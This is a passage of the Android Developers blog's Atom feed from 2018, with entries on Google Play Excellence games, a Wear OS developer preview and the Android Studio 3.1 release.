&lt;a href="https://play.google.com/store/apps/details?id=com.pikpok.dr2.play&amp;e=-EnableAppDetailsPageRedesign"&gt;Into the Dead 2&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.sinyee.babybus.restaurant"&gt;Little Panda Restaurant&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.kabam.marvelbattle"&gt;MARVEL Contest of Champions&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.etermax.orbital1"&gt;Orbital 1&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.yodo1.roda"&gt;Rooms of Doom&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=pine.game.skydancer"&gt;Sky Dancer Run&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.protostar.sling"&gt;Sling Kong&lt;/a&gt;
&lt;p&gt;
&lt;a href="https://play.google.com/store/apps/details?id=com.ChillyRoom.DungeonShooter"&gt;Soul Knight&lt;/a&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;


&lt;p&gt;
Explore other great apps and games in the &lt;a href="https://play.google.com/store/apps/topic?id=editors_choice"&gt;Editors' Choice&lt;/a&gt; section on Google Play and &lt;a href="https://developer.android.com/distribute/best-practices/index.html"&gt;discover best practices&lt;/a&gt; to help you build quality apps and games.
&lt;/p&gt;
&lt;center&gt;
&lt;p&gt;
 How useful did you find this blogpost?
&lt;br&gt;
&lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=1%E2%98%85+%E2%80%93+Not+at+all&amp;entry.2056663615&amp;entry.646747778=AndroidExcellencerefresh-10/27" style="color:gold;"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=2%E2%98%85+%E2%80%93+Not+very&amp;entry.2056663615&amp;entry.646747778=AndroidExcellencerefresh-10/27" style="color:gold;"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=3%E2%98%85+%E2%80%93+Somewhat&amp;entry.2056663615&amp;entry.646747778=AndroidExcellencerefresh-10/27" style="color:gold;"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=4%E2%98%85+%E2%80%93+Very&amp;entry.2056663615&amp;entry.646747778=AndroidExcellencerefresh-10/27" style="color:gold;"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=5%E2%98%85+%E2%80%93+Extremely&amp;entry.2056663615&amp;entry.646747778=AndroidExcellencerefresh-10/27" style="color:gold;"&gt;★&lt;/a&gt;
&lt;/p&gt;

&lt;p&gt;
&lt;a href="https://2.bp.blogspot.com/-eKVHlD1nQJE/WsUNzScG80I/AAAAAAAAFMI/KcXe_FGOk84wJq0PEqdvGAYMN4jJqIBsACLcBGAs/s1600/image2.png" imageanchor="1" &gt;&lt;img id="imageTwo" border="0" src="https://2.bp.blogspot.com/-eKVHlD1nQJE/WsUNzScG80I/AAAAAAAAFMI/KcXe_FGOk84wJq0PEqdvGAYMN4jJqIBsACLcBGAs/s1600/image2.png" data-original-width="499" data-original-height="281" /&gt;&lt;/a&gt;
&lt;/p&gt;
&lt;/center&gt;

&lt;style&gt;
#imageOne {
display: block;
width: 90%;
margin: 10px auto;
padding: 0;
}

#imageTwo {
display: block;
width: 40%;
margin: 0px auto 0px auto;
padding: 0;
}

#caption {
font-size: 85%;
font-style: italic;
text-align: center;
margin: 5px 0px 10px 0px
}

table {
line-height: 1.5em;
}
&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=R58XhpPYeEo:hicl_P6i8qQ:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=R58XhpPYeEo:hicl_P6i8qQ:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=R58XhpPYeEo:hicl_P6i8qQ:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/R58XhpPYeEo" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/7120919803876537620"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/7120919803876537620"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/R58XhpPYeEo/introducing-new-android-excellence-apps.html" title="Introducing new Android Excellence apps and games on Google Play"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://3.bp.blogspot.com/-WKwBKUfq5lA/WsUNQfbmhuI/AAAAAAAAFMA/KH6RE2zupHMzTb2fAm_4jsjAbP8L8lr4wCLcBGAs/s72-c/image1.jpg" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/04/introducing-new-android-excellence-apps.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-547449939863263228</id>
    <published>2018-03-28T10:43:00.000-07:00</published>
    <updated>2018-03-28T10:46:42.023-07:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Developer Preview"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Wear OS"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="wearos"/>
    <title type="text">Wear OS by Google developer preview </title>
    <content type="html">&lt;meta name="twitter:image" content="https://4.bp.blogspot.com/-q19CWzxeFYU/Wrq0SG-ET8I/AAAAAAAAFLU/WcIZ4xEd8m8CTXxFm_gORZ_yG3Itm9p8QCLcBGAs/s1600/image1.png"&gt;

&lt;em&gt;Posted by &lt;a href="https://twitter.com/hoitab"&gt;Hoi Lam&lt;/a&gt;, Lead Developer Advocate, Wear OS by Google&lt;/em&gt;

&lt;a href="https://4.bp.blogspot.com/-q19CWzxeFYU/Wrq0SG-ET8I/AAAAAAAAFLU/WcIZ4xEd8m8CTXxFm_gORZ_yG3Itm9p8QCLcBGAs/s1600/image1.png" imageanchor="1" &gt;&lt;img id="imgFull" border="0" src="https://4.bp.blogspot.com/-q19CWzxeFYU/Wrq0SG-ET8I/AAAAAAAAFLU/WcIZ4xEd8m8CTXxFm_gORZ_yG3Itm9p8QCLcBGAs/s1600/image1.png" data-original-width="1244" data-original-height="698" /&gt;&lt;/a&gt;

&lt;p&gt;
Today we launched the Wear OS by Google developer preview and brought Android P platform features to wearables. The developer preview includes updated system images on the official Android Emulator and a downloadable system image for the Huawei Watch 2 Bluetooth or Huawei Watch 2 Classic Bluetooth. This initial release is intended for developers only and is not for daily or consumer use. Therefore, it is only available via manual download and flash. Please refer to the &lt;a href="https://developer.android.com/wear/releases/index.html"&gt;release notes&lt;/a&gt; for known issues before &lt;a href="https://developer.android.com/wear/releases/wear-preview-downloads.html"&gt;downloading and flashing your device&lt;/a&gt;.
&lt;/p&gt;
&lt;p&gt;
In this release, we would like to highlight the following features that developers should pay attention to:
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;&lt;a href="http://g.co/dev/appcompat"&gt;Restriction related to non-SDK methods and fields&lt;/a&gt;&lt;/strong&gt;: To improve app compatibility, Android P has started the process of restricting access to non-SDK methods and fields. Developers should make plans to migrate away from these. If there is no public equivalent for your use case, &lt;a href="https://issuetracker.google.com/issues/new?component=328403&amp;template=1027267"&gt;please let us know&lt;/a&gt;.
&lt;li&gt;&lt;strong&gt;Dark UI system theme&lt;/strong&gt;: To enhance glanceability, Wear OS has switched to a UI theme with a darker / black background for the notifications stream and system launcher since the start of the year. This is now also the default for the system theme and should improve the glanceability for wear apps. Developers should check the accessibility of their app's UI after this change.
&lt;li&gt;&lt;strong&gt;Limited background activity:&lt;/strong&gt; To improve power, apps will no longer be allowed to run in the background unless the watch is on the charger. Developers should note that Wear OS is going further with Android's &lt;a href="https://developer.android.com/training/monitoring-device-state/doze-standby.html#understand_app_standby"&gt;app standby&lt;/a&gt; feature than some other form factors. Exceptions to this include &lt;a href="https://developer.android.com/training/wearables/watch-faces/index.html"&gt;watch faces&lt;/a&gt; and &lt;a href="https://developer.android.com/training/wearables/watch-faces/exposing-data-complications.html"&gt;complications&lt;/a&gt; that the user currently has selected. This feature will be rolled out gradually in the developer preview, so you may not see it immediately on your device, but should build your apps accordingly by removing background services.
&lt;li&gt;&lt;strong&gt;Turning off radios when off body&lt;/strong&gt;: To improve power, bluetooth, WiFi, and cellular radios will be turned off when the watch is detected to be off body for an extended period of time. Again, this feature will be rolled out gradually so you may not initially see it on your device. If this feature causes challenges in your development process, you can disable the feature via adb; please follow the instructions in the &lt;a href="https://developer.android.com/wear/releases/index.html"&gt;release notes&lt;/a&gt;.
&lt;li&gt;&lt;strong&gt;WiFi off when BT is disconnected:&lt;/strong&gt; To improve power, the device will no longer automatically connect to wifi when disconnected from bluetooth. Exceptions include if an app is requesting a high bandwidth network or if the watch is on the charger. This feature will be rolled out gradually so you may not initially see it on your device.&lt;/li&gt;&lt;/ul&gt;

&lt;h3&gt;Please give us your feedback&lt;/h3&gt;


&lt;p&gt;
We expect to provide several updates to this preview before the final production release. Please submit any bugs you find via the &lt;a href="https://issuetracker.google.com/issues/new?component=192711&amp;template=840908"&gt;Wear OS by Google issue tracker&lt;/a&gt;. The earlier you submit them, the higher the likelihood that we can include the fixes in the final release.
&lt;/p&gt;

&lt;style&gt;
#imgFull {
display: block;
width: 90%;
margin: 10px auto;
padding: 0;
}
&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=O4XeXuVVcFs:yh6F56u7xPM:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=O4XeXuVVcFs:yh6F56u7xPM:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=O4XeXuVVcFs:yh6F56u7xPM:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/O4XeXuVVcFs" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/547449939863263228"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/547449939863263228"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/O4XeXuVVcFs/wear-os-by-google-developer-preview.html" title="Wear OS by Google developer preview "/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://4.bp.blogspot.com/-q19CWzxeFYU/Wrq0SG-ET8I/AAAAAAAAFLU/WcIZ4xEd8m8CTXxFm_gORZ_yG3Itm9p8QCLcBGAs/s72-c/image1.png" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/03/wear-os-by-google-developer-preview.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-5577592414180820563</id>
    <published>2018-03-26T14:17:00.000-07:00</published>
    <updated>2018-03-26T16:05:38.324-07:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android Studio"/>
    <title type="text">Android Studio 3.1</title>
    <content type="html">&lt;em&gt;Posted by &lt;a href="https://www.google.com/+JamalEason"&gt;Jamal Eason&lt;/a&gt;, Product Manager, Android&lt;/em&gt;

&lt;a href="https://1.bp.blogspot.com/-1Ksf7Hs0XJc/WrlKFWcSKCI/AAAAAAAAFKE/Vr8i6c1dLmcek-nWcbI4UrDVYBMVS_B1QCLcBGAs/s1600/logo_android_studio_512dp.png" imageanchor="1" &gt;&lt;img id="floatRight" border="0" src="https://1.bp.blogspot.com/-1Ksf7Hs0XJc/WrlKFWcSKCI/AAAAAAAAFKE/Vr8i6c1dLmcek-nWcbI4UrDVYBMVS_B1QCLcBGAs/s1600/logo_android_studio_512dp.png" data-original-width="250" data-original-height="225" /&gt;&lt;/a&gt;

&lt;p&gt;
We are excited to announce that Android Studio 3.1 is now available to &lt;a href="https://developer.android.com/studio/index.html"&gt;download&lt;/a&gt; in the stable release channel. The focus areas for this release are around product quality and app development productivity. In addition to many underlying quality changes, we added several new features into Android Studio 3.1 that you should integrate into your development flow. 
&lt;/p&gt;
&lt;p&gt;
New to Android Studio 3.1 is a C++ performance profiler to help troubleshoot performance bottlenecks in your app code. For those of you with a Room or SQLite database in their your app, we added better code editor support to aid in your SQL table and query creation statements. We also added better lint support for your Kotlin code, and accelerated your testing with an updated Android Emulator with Quick Boot.  If any of these features sound exciting or you are looking for the next stable version of Android Studio, you should download Android Studio 3.1 today!
&lt;/p&gt;
&lt;p&gt;
Check out the list of new features in Android Studio 3.1 below, organized by key developer flows. 
&lt;/p&gt;

&lt;center&gt;
&lt;iframe width="560" height="315" style="margin:10px 0 0 0;" src="https://www.youtube.com/embed/nnnW0nehPEA" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen&gt;&lt;/iframe&gt;
&lt;/center&gt;

&lt;p id="caption"&gt;
What's new in Android Studio 3.1
&lt;/p&gt;

&lt;h2&gt;Develop &lt;/h2&gt;

&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;Kotlin Lint Checks &lt;/strong&gt; -&lt;strong&gt; &lt;/strong&gt;Since announcing &lt;a href="https://android-developers.googleblog.com/2017/05/android-announces-support-for-kotlin.html"&gt;official Kotlin language support&lt;/a&gt; last year on the Android platform, we continue to invest in Kotlin language support in Android Studio. In Android Studio 3.1, we enhanced the Lint code quality checks so that now you can run them via the command line as well as from the IDE. Just open a Android Studio project, and run &lt;strong&gt;&lt;code&gt;gradlew lint&lt;/code&gt;&lt;/strong&gt; via command line. &lt;a href="https://developer.android.com/studio/write/lint.html#commandline"&gt;Learn more&lt;/a&gt;. &lt;/li&gt;&lt;/ul&gt;

&lt;a href="https://2.bp.blogspot.com/-LNd9E10e8k4/WrlK--lX_-I/AAAAAAAAFKQ/7CJpIdAQTdsoHVDZ_i1CfMfc8xqZmRHAQCLcBGAs/s1600/Kotlin_Lint.png" imageanchor="1" &gt;&lt;img id="imgFull" border="0" src="https://2.bp.blogspot.com/-LNd9E10e8k4/WrlK--lX_-I/AAAAAAAAFKQ/7CJpIdAQTdsoHVDZ_i1CfMfc8xqZmRHAQCLcBGAs/s1600/Kotlin_Lint.png" data-original-width="735" data-original-height="324" /&gt;&lt;/a&gt;


&lt;p id="caption"&gt;
Kotlin Lint checks via command line
&lt;/p&gt;

&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;Database Code Editing &lt;/strong&gt; -&lt;strong&gt; &lt;/strong&gt;Editing inline SQL/Room Database code in your Android project is now even easier with Android Studio 3.1. This release has SQL code completion in your @&lt;a href="https://developer.android.com/training/data-storage/room/accessing-data.html#query"&gt;Query&lt;/a&gt; declarations, better SQL statement refactoring, and SQL code navigation across your project. &lt;a href="https://developer.android.com/studio/releases/index.html#codingide"&gt;Learn more&lt;/a&gt;. &lt;/li&gt;&lt;/ul&gt;

&lt;a href="https://3.bp.blogspot.com/-8tCZAtbeQ5A/WrlLSHgmjJI/AAAAAAAAFKY/o5V49-yUSyUUy0_IUUVwx7mFUO155c-CwCLcBGAs/s1600/room_sql_code_editing.png" imageanchor="1" &gt;&lt;img id="imgFull" border="0" src="https://3.bp.blogspot.com/-8tCZAtbeQ5A/WrlLSHgmjJI/AAAAAAAAFKY/o5V49-yUSyUUy0_IUUVwx7mFUO155c-CwCLcBGAs/s1600/room_sql_code_editing.png" data-original-width="1242" data-original-height="466" /&gt;&lt;/a&gt;



&lt;p id="caption"&gt;
Room Database code completion
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;IntelliJ Platform Update&lt;/strong&gt;: Android Studio 3.1 includes the IntelliJ 2017.3.3 platform release, which has many new features such as new Kotlin language intentions and built-in support for SVG image preview. &lt;a href="https://www.jetbrains.com/idea/whatsnew/#v2017-3"&gt;Learn more&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;

&lt;h2&gt;Build&lt;/h2&gt;

&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;D8 Dex Compiler  &lt;/strong&gt;-&lt;strong&gt; &lt;/strong&gt;D8 is now the default dex compiler in Android Studio 3.1. &lt;a href="https://android-developers.googleblog.com/2017/08/next-generation-dex-compiler-now-in.html"&gt;Replacing the legacy DX compiler&lt;/a&gt;, D8 dexing is an under the hood APK compilation step that makes your app size smaller, enables accurate step debugging, and many times leads to faster builds.  Ensure that your gradle.properties either has no &lt;strong&gt;&lt;code&gt;android.enableD8&lt;/code&gt;&lt;/strong&gt; flag, or if it does ensure that it is set to &lt;strong&gt;&lt;code&gt;true&lt;/code&gt;&lt;/strong&gt;.  &lt;a href="https://developer.android.com/studio/releases/gradle-plugin.html#D8"&gt;Learn more&lt;/a&gt;. &lt;/li&gt;&lt;/ul&gt;
&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;New Build Output Window&lt;/strong&gt; - Android Studio 3.1 has an updated Build output window which organizes build status and errors in a new tree view. This change also consolidates the legacy Gradle output into this new window. &lt;a href="http://d.android.com/studio/run/index.html#gradle-console"&gt;Learn more&lt;/a&gt;. &lt;/li&gt;&lt;/ul&gt;

&lt;a href="https://3.bp.blogspot.com/-Thr46lXD_g8/WrlLpTsuikI/AAAAAAAAFKk/_wDxBgKu1QQ1hflvpziVAq795Dsb06Y3wCLcBGAs/s1600/build_output.png" imageanchor="1" &gt;&lt;img id="imgFull" border="0" src="https://3.bp.blogspot.com/-Thr46lXD_g8/WrlLpTsuikI/AAAAAAAAFKk/_wDxBgKu1QQ1hflvpziVAq795Dsb06Y3wCLcBGAs/s1600/build_output.png" data-original-width="1600" data-original-height="425" /&gt;&lt;/a&gt;

&lt;p id="caption"&gt;
New Build Output Window
&lt;/p&gt;
&lt;h2&gt;Test&lt;/h2&gt;

&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;Quick Boot  &lt;/strong&gt;-&lt;strong&gt; &lt;/strong&gt; Quick Boot allows you to resume your Android Emulator session in under 6 seconds. Slow start time on the Android Emulator was a major pain point we heard from you and Quick Boot solves this issue.  Like a physical Android device, the emulator must perform an initial cold boot, but subsequent starts are fast. The feature is enabled by default for all Android Virtual Devices. Additionally, in this release, you have finer grain controls of when to use Quick Boot and the ability to save the quick boot state on demand under the emulator settings page.   &lt;a href="https://android-developers.googleblog.com/2017/12/quick-boot-top-features-in-android.html"&gt;Learn more of other top Android Emulator Features.&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt;

&lt;a href="https://1.bp.blogspot.com/-OVuyWY8I9Sk/WrlL1OCty2I/AAAAAAAAFKs/RFRmYNYxPQU0TPpxyebexwT8YzLnL1q6ACLcBGAs/s1600/on_demand_quickboot.png" imageanchor="1" &gt;&lt;img id="imgFull" border="0" src="https://1.bp.blogspot.com/-OVuyWY8I9Sk/WrlL1OCty2I/AAAAAAAAFKs/RFRmYNYxPQU0TPpxyebexwT8YzLnL1q6ACLcBGAs/s1600/on_demand_quickboot.png" data-original-width="1600" data-original-height="830" /&gt;&lt;/a&gt;

&lt;p id="caption"&gt;
Quick Boot On Demand Setting
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;System Images and Frameless Device Skins - &lt;/strong&gt;The latest version of the Android Emulator now supports the Google Play Store and Google APIs on API 24 (Nougat) - API 27 (Oreo) emulator systems images as well as the P Developer Preview. Additionally the device emulator skins are updated to work in a new frameless mode, which can help you test your app with &lt;a href="https://android-developers.googleblog.com/2017/03/update-your-app-to-take-advantage-of.html"&gt;18:9 screen aspect ratios&lt;/a&gt;, or Android P Developer Preview &lt;a href="https://developer.android.com/reference/android/view/DisplayCutout.html"&gt;DisplayCutout&lt;/a&gt; APIs. &lt;a href="https://developer.android.com/studio/releases/emulator.html#27-1-8"&gt;Learn more&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;

&lt;a href="https://3.bp.blogspot.com/-c3eZmZUmXQA/WrlL-iXjXHI/AAAAAAAAFKw/CfjFIyuS2kkmWxGVaNk9koUUTZPZdNVLwCLcBGAs/s1600/pixel_2_xl_round_corners_notch_emulator.png" imageanchor="1" &gt;&lt;img id="imgFull" border="0" src="https://3.bp.blogspot.com/-c3eZmZUmXQA/WrlL-iXjXHI/AAAAAAAAFKw/CfjFIyuS2kkmWxGVaNk9koUUTZPZdNVLwCLcBGAs/s1600/pixel_2_xl_round_corners_notch_emulator.png" data-original-width="1600" data-original-height="840" /&gt;&lt;/a&gt;

&lt;p id="caption"&gt;
Window frameless mode in the Android Emulator
&lt;/p&gt;
&lt;h2&gt;Optimize&lt;/h2&gt;

&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;C++ CPU Profiling &lt;/strong&gt;-&lt;strong&gt; &lt;/strong&gt;Last year with Android Studio 3.0, we launched a brand new set of &lt;a href="http://d.android.com/studio/profile/android-profiler.html"&gt;Android profilers&lt;/a&gt; to measure the CPU, Memory, and Network Activity in your app. With Android Studio 3.1, in addition to performance profiling your Kotlin and Java language app code, you can now profile your C++ code in your app.  Using &lt;a href="https://developer.android.com/ndk/guides/simpleperf.html"&gt;simpleperf&lt;/a&gt; as backend, the C++ profiler allows you to record C++ method traces. &lt;a href="https://d.android.com/studio/profile/cpu-profiler.html"&gt;Learn more&lt;/a&gt;. &lt;/li&gt;&lt;/ul&gt;

&lt;a href="https://2.bp.blogspot.com/-5DVWJ9C_OTE/WrlMH8nvuUI/AAAAAAAAFK0/kHyPFfICz88-I8n_dLml7IyNcZWg3Q7XACLcBGAs/s1600/c_plus_plus_profiler.png" imageanchor="1" &gt;&lt;img id="imgFull" border="0" src="https://2.bp.blogspot.com/-5DVWJ9C_OTE/WrlMH8nvuUI/AAAAAAAAFK0/kHyPFfICz88-I8n_dLml7IyNcZWg3Q7XACLcBGAs/s1600/c_plus_plus_profiler.png" data-original-width="1600" data-original-height="918" /&gt;&lt;/a&gt;

&lt;p id="caption"&gt;
C++ CPU Profiler
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;&lt;strong&gt;Network Profiler Updates: Threads &amp; Network Request &lt;/strong&gt;-&lt;strong&gt; &lt;/strong&gt;To aid with analyzing network traffic in your app, we added a new Network Thread view to inspect multithreaded network traffic, and we also added a new Network Request tab to dig into the network requests over time. With these updates to the Network Profiler you will have additional tools to trace the network traffic from each thread and network request all the way down through the network call stack.  &lt;a href="http://d.android.com/studio/profile/network-profiler.html"&gt;Learn more&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;

&lt;a href="https://1.bp.blogspot.com/-IJUgzmFmns4/WrlMREUuxTI/AAAAAAAAFK8/B2f8oVcPbukuWrYkzXyR8E_E1SHH_VOUACLcBGAs/s1600/network_threads.png" imageanchor="1" &gt;&lt;img id="imgFull" border="0" src="https://1.bp.blogspot.com/-IJUgzmFmns4/WrlMREUuxTI/AAAAAAAAFK8/B2f8oVcPbukuWrYkzXyR8E_E1SHH_VOUACLcBGAs/s1600/network_threads.png" data-original-width="1600" data-original-height="918" /&gt;&lt;/a&gt;

&lt;p id="caption"&gt;
Network Profiler with thread support
&lt;/p&gt;

&lt;p&gt;
To recap, Android Studio 3.1 includes these new major features: 
&lt;/p&gt;
&lt;p&gt;
&lt;strong&gt;Develop&lt;/strong&gt;
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;Kotlin Lint Checks 
&lt;li&gt;Database Code Editing
&lt;li&gt;IntelliJ Platform Update&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;
&lt;strong&gt;Build&lt;/strong&gt;
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;D8 Dex Compiler
&lt;li&gt;New Build Output Window&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;
&lt;strong&gt;Test &amp; Debug &lt;/strong&gt;
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;Quick Boot for Android Emulator
&lt;li&gt;API 27 with Google Play Emulator System Images
&lt;li&gt;Window frameless mode for Android Emulator&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;
&lt;strong&gt;Optimize&lt;/strong&gt;
&lt;/p&gt;&lt;ul&gt;

&lt;li&gt;C++ Profiler
&lt;li&gt;Network Profiler - Thread Support
&lt;li&gt;Network Profiler - Request Support&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;
Check out the &lt;a href="https://developer.android.com/studio/releases/index.html#3-1-0"&gt;release notes&lt;/a&gt; for more details.
&lt;/p&gt;
&lt;h2&gt;Getting Started &lt;/h2&gt;


&lt;p&gt;
&lt;strong&gt;Download &lt;/strong&gt;
&lt;/p&gt;
&lt;p&gt;
If you are using a previous version of Android Studio, you can upgrade to Android Studio 3.1 today or you can download the update from the official Android Studio &lt;a href="https://developer.android.com/studio/index.html"&gt;download page&lt;/a&gt;. 
&lt;/p&gt;
&lt;p&gt;
We appreciate any feedback on things you like, issues or features you would like to see. If you find a bug or issue, feel free to &lt;a href="https://source.android.com/source/report-bugs#developer-tools"&gt;file an issue&lt;/a&gt;. Connect with us -- the Android Studio development team ‐ on our &lt;a href="https://plus.google.com/103342515830390186255"&gt;Google+&lt;/a&gt; page or on &lt;a href="http://www.twitter.com/androidstudio"&gt;Twitter&lt;/a&gt;.
&lt;/p&gt;

&lt;style&gt;
#floatRight {
float: right;
width: 40%;
margin: 0 0 5px 5px;
padding: 0;
}

#imgFull {
display: block;
width: 90%;
margin: 10px auto 5px auto;
padding: 0;
}

#caption {
text-align: center;
margin: 0 0 10px 0;
padding: 0;
font-style: italic;
font-size: 85%;
}

h2 {
font-size: 130%;
}

&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=yeG0GUvZyFQ:j3Xkpavim0I:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=yeG0GUvZyFQ:j3Xkpavim0I:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=yeG0GUvZyFQ:j3Xkpavim0I:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/yeG0GUvZyFQ" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/5577592414180820563"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/5577592414180820563"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/yeG0GUvZyFQ/android-studio-3-1.html" title="Android Studio 3.1"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-1Ksf7Hs0XJc/WrlKFWcSKCI/AAAAAAAAFKE/Vr8i6c1dLmcek-nWcbI4UrDVYBMVS_B1QCLcBGAs/s72-c/logo_android_studio_512dp.png" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/03/android-studio-3-1.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-8487264364249050843</id>
    <published>2018-03-20T14:23:00.000-07:00</published>
    <updated>2018-03-20T14:25:31.337-07:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Activity Recognition"/>
